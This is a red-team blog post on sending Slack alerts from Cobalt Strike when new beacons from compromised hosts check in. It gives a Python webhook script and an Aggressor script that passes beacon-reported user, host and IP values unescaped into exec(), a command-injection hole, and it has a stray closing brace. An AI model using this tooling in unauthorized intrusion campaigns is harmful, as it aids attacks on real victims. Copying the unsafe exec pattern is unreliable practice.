# Slack Notifications for Cobalt Strike

**Andrew Chiles | December 5, 2017 | Tweet This Post: [:fa-twitter:](https://twitter.com/intent/tweet?url=http://threatexpress.com/blogs/2016/12/slack-notifications-for-cobalt-strike/&text=Slack Notifications for Cobalt Strike)**

We've seen several great incoming agent/shell notification mechanisms for Metasploit and Empire recently and the utility of being notified when new shells appear is without question. This is especially true when conducting phishing and social engineering style attacks or while waiting for a persistence mechanism to trigger. A recent example is [SlackShellBot][1] by @Ne0nd0g.  We really like it, but often use Cobalt Strike heavily and thus need another notification method for CS.

Enter Aggressor script. This is just one quick example of performing Slack notifications for Cobalt Strike using Aggressor. If you're a regular CS user, we highly recommend [spending some time][2] with Aggressor scripting to step up your automation and workflows. @armitagehacker has a [comprehensive post ][3]of Aggressor resources that is a great starting point.

![New Beacon Slack Notifications][4]

New Beacon Slack Notifications

**Requirements:**

* This method relies on a custom web-hook just as SlackShellBot. Refer the [official documentation][5] if you need a quick guide on creating one
* A Python module for Slack integrations called "slackweb" 
    * Using pip: `pip install slackweb`

### Step 1: Create your Custom Slack Webhook

![Slack Custom Webhook Configuration][6]

Slack Custom Webhook Configuration
 

### Step 2: Create a Python script to post the Slack notifications

This Python code is a basic example of using the slackweb module to submit a Slack text notification to our custom webhook. Don't forget to make the script executable!
    
    #! /usr/bin/env python
    # slacknotifcation.py
    
    import argparse
    import slackweb
    import socket
    
    parser = argparse.ArgumentParser(description='beacon info')
    parser.add_argument('--computername')
    parser.add_argument('--internalip')
    parser.add_argument('--username')
    
    hostname = socket.gethostname()
    
    args = parser.parse_args()
    
    slackUrl = "https://hooks.slack.com/services/..."
    computername = args.computername
    internalip = args.internalip
    username = args.username
    
    slack = slackweb.Slack(url=slackUrl)
    message = "New Beacon: {}@{} ({}) on {}".format(username,computername,internalip,hostname)
    slack.notify(text=message)

### 

### Step 3: Create the Aggressor script

Save the following code as a new Aggressor script. You can customize the desired information and format of the Slack notification here. The format provided in this example is "New Beacon: USERNAME@HOSTNAME (IP ADDRESS) on C2SERVERHOSTNAME"

!!! Note 
    You could also modify this Aggressor script to use curl and eliminate the need for Python and an additional module entirely! However, Python allows us to quickly grab the hostname of the C2 server and easily track what assessment/campaign the incoming beacons are associated with.

```    
# Issue initial commands upon new beacon checkin
# slacknotification.cna

on beacon_initial {
    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
    local('$internalIP $computerName $userName');
    $internalIP = replace(beacon_info($1,"internal")," ","_");
    $computerName = replace(beacon_info($1,"computer")," ","_");
    $userName = replace(beacon_info($1,"user")," ","_");
    $cmd = '/path/to/slacknotification.py --computername ' . $computerName . " --internalip " . $internalIP . " --username " . $userName;

    println("Sending Slack Notification: " . $cmd);
    exec($cmd);
    }
}
```

### Step 4: Load the Aggressor script into Cobalt Strike

The Aggressor script can be [loaded][7] into CS via the GUI or headless mode. Once loaded, fire off some beacons and watch the notifications come in!

Hopefully this post is useful and let us know if you have additional ideas or improvements!

[1]: https://www.swordshield.com/2016/11/slackshellbot/
[2]: https://www.cobaltstrike.com/aggressor-script/index.html
[3]: http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/
[4]: /threatexpress/img/20161205_slacknotification.png
[5]: https://api.slack.com/incoming-webhooks
[6]: /threatexpress/img//2016/12/20161205_CSIntegration.png
[7]: https://www.cobaltstrike.com/help-scripting

  